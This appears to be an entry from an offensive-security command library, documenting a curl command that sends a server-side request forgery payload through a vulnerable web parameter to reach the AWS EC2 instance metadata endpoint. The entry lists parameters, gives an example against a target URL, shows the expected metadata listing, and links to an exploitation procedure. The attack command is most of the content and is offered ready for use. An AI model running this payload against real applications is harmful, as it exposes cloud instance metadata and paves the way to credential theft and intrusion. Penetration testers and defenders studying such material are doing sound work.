---
type: command
executor: bash
data: 'curl "$_VULN_URL?target=http://169.254.169.254/latest/meta-data/" -v'
output: null
created_at: '2023-04-06T03:56:38Z'
updated_at: '2023-04-10T20:23:59Z'
platforms:
  - Web
  - AWS
tags:
  - ssrf
  - metadata
verified: true
validated: true
---

# curl-basic-aws-metadata-endpoint

## Command

```bash
curl "$_VULN_URL?target=http://169.254.169.254/latest/meta-data/" -v
```

## Description

Sends an SSRF payload to access the root AWS EC2 metadata endpoint via a vulnerable application parameter.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_VULN_URL | Vulnerable application URL with SSRF parameter (e.g., https://target.com/api?target=) | Yes |
| -v | Verbose output to see request/response details | No |

## Examples

### Basic Usage

```bash
curl "https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/" -v
```

## Expected Output

Metadata directory listing:
ami-id
architecture
...

## Related

- [[procedures/Exploit-SSRF-to-Access-AWS-Instance-Metadata]]
